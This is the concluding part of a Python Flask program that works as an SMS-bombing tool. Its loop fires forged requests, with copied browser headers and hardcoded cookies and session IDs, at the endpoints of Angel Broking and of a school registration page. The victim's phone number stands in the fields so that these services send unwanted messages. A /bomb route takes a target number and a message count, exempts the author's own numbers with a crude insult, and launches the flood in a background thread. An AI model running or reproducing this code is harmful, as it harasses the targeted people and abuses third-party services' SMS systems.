            requests.post("https://www.angelbroking.com/form-gateways/oda-form.php", headers=headers, data=data)
        except:
            pass

        # Itrade GET 1
        try:
            headers = {
                "Host": "itrade.angelbroking.com",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://www.angelbroking.com/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Cookie": "__cfduid=de733792a27631a027bfa486e16f221d41604563134; _gcl_au=1.1.229780243.1604563178; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gid=GA1.2.113287213.1604563179; _fbp=fb.1.1604563209374.2038457169; _lo_uid=156545-1604563454540-7e143755be6613e0; _lorid=156545-1604563454540-8a19f094f5338582; _lo_v=1; __lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _gat_UA-1186489-17=1; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpmnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q"
            }
            params = {
                "id": "tyn",
                "city": "UHVuZQ==",
                "name": "U3Bhcmt5IEhhY2tlcg==",
                "mobile": "OTUxOTg3NDcwNA==",
                "cms_id": "3944368",
                "page_url": "aHR0cHM6Ly93d3cuYW5nZWxicm9raW5nLmNvbS9vcGVuLWRlbWF0LWFjY291bnQ%2FdXRtX3NvdXJjZT13ZWImdXRtX21lZGl1bT1vcmdhbmlj",
                "isotp": "WQ%3D%3D"
            }
            requests.get("https://itrade.angelbroking.com/ClientInfo/AngelBrokingParameters", headers=headers, params=params)
        except:
            pass

        # Itrade GET 2
        try:
            headers = {
                "Host": "itrade.angelbroking.com",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://www.angelbroking.com/",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Cookie": "__cfduid=de733792a27631a027bfa486e16f221d41604563134; _gcl_au=1.1.229780243.1604563178; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gid=GA1.2.113287213.1604563179; _fbp=fb.1.1604563209374.2038457169; _lo_uid=156545-1604563454540-7e143755be6613e0; _lorid=156545-1604563454540-8a19f094f5338582; _lo_v=1; __lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _gat_UA-1186489-17=1; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpmnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q; ASP.NET_SessionId=ad3jfas1tjltol4sdrshyuin"
            }
            params = {
                "utm_source": "web",
                "utm_medium": "organic",
                "page_url": "https%3A%2F%2Fwww.angelbroking.com%2Fopen-demat-account%3Futm_source%3Dweb%26utm_medium%3Dorganic",
                "cms_id": "3944368"
            }
            requests.get("https://itrade.angelbroking.com/", headers=headers, params=params)
        except:
            pass
        times += 1

        # Asvmfaizabad
        try:
            headers = {
                "Host": "asvmfaizabad.org",
                "Connection": "keep-alive",
                "Content-Length": "83",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "http://asvmfaizabad.org",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Referer": "http://asvmfaizabad.org/register.php",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
                "Cookie": "wh-widget-cookie=1"
            }
            data = {
                "sname": "Tsunami",
                "sclass": "XII",
                "sphone": target,
                "spassword": "tsunamiastronomia",
                "ssection": "A",
                "submit": ""
            }
            requests.post("http://asvmfaizabad.org/register.php", headers=headers, data=data)
        except:
            pass
        times += 1

        if times > msgs:
            break

@app.route('/', methods=['GET'])
def home():
    return render_template('index.html')

@app.route('/bomb', methods=['POST'])
def bomb():
    target = request.form.get('phone')
    msgs = request.form.get('count')

    if not target or not msgs:
        flash('Please enter a valid phone number and count.')
        return redirect(url_for('home'))

    try:
        msgs = int(msgs)
    except ValueError:
        flash('Count must be an integer.')
        return redirect(url_for('home'))

    max_msgs = 10**500
    ph1 = '7477513373'
    ph2 = '8001233463'

    if len(target) != 10:
        flash('Invalid phone number (must be 10 digits).')
        return redirect(url_for('home'))
    elif target in [ph1, ph2]:
        flash("I know you f*cked your mom last night :)")
        return redirect(url_for('home'))
    elif msgs <= 0:
        flash('Invalid SMS count.')
        return redirect(url_for('home'))
    elif msgs > max_msgs:
        flash('This isn\'t fair, you are trying to take revenge!!!')
        return redirect(url_for('home'))

    color = random.choice(colors)

    threading.Thread(target=infinite, args=(target, color, msgs)).start()

    flash(f'Bombing started for {msgs} messages to +91{target}. Please wait...')
    return redirect(url_for('home'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=True)